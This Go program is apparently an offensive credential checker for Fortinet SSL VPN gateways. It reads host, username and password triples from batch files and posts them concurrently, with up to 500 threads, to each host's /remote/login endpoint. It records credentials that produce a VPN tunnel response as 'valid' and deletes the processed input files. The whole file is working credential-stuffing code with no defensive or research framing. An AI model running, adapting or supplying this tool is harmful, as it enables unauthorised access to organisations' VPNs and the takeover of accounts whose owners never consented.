//go:build ignore

package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

var (
	fileDir   = "/root/NAM/Check"
	validDir  = "/root/NAM/Servis"
	validFile = filepath.Join(validDir, "valid.txt")
)

type config struct {
	Threads int
	Timeout time.Duration
}

func readConfig(path string) config {
	cfg := config{Threads: 500, Timeout: 10 * time.Second}
	f, err := os.Open(path)
	if err != nil {
		return cfg
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "threads") {
			fmt.Sscanf(line, "threads=%d", &cfg.Threads)
		}
		if strings.HasPrefix(line, "timeout") {
			var t int
			if _, err := fmt.Sscanf(line, "timeout=%d", &t); err == nil {
				cfg.Timeout = time.Duration(t) * time.Second
			}
		}
	}
	return cfg
}

func appendValid(line string) {
	f, err := os.OpenFile(validFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
	if err != nil {
		return
	}
	defer f.Close()
	io.WriteString(f, line+"\n")
}

func worker(id int, client *http.Client, jobs <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for line := range jobs {
		parts := strings.Split(line, ";")
		if len(parts) < 3 {
			continue
		}
		url := fmt.Sprintf("https://%s/remote/login", strings.TrimSpace(parts[0]))
		data := "username=" + parts[1] + "&password=" + parts[2]
		req, _ := http.NewRequest("POST", url, strings.NewReader(data))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(req)
		if err == nil {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			if resp.StatusCode == 200 && strings.Contains(string(body), "vpn/tunnel") {
				fmt.Printf("[Fortinet] %s is valid\n", line)
				appendValid(line)
			} else {
				fmt.Printf("[Fortinet] %s is invalid\n", line)
			}
		} else {
			fmt.Printf("[Fortinet] request error for %s: %v\n", line, err)
		}
	}
}

func main() {
	cfg := readConfig("config.txt")
	fmt.Printf("[Fortinet] Using %d threads.\n", cfg.Threads)

	os.MkdirAll(fileDir, os.ModePerm)
	os.MkdirAll(validDir, os.ModePerm)

	files, _ := filepath.Glob(filepath.Join(fileDir, "part_*.txt"))
	if len(files) == 0 {
		fmt.Println("[Fortinet] no input files")
		return
	}

	client := &http.Client{Timeout: cfg.Timeout}
	jobs := make(chan string, cfg.Threads)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go worker(i, client, jobs, &wg)
	}

	for _, fp := range files {
		f, err := os.Open(fp)
		if err != nil {
			continue
		}
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			jobs <- line
		}
		f.Close()
		os.Remove(fp)
	}
	close(jobs)
	wg.Wait()
}
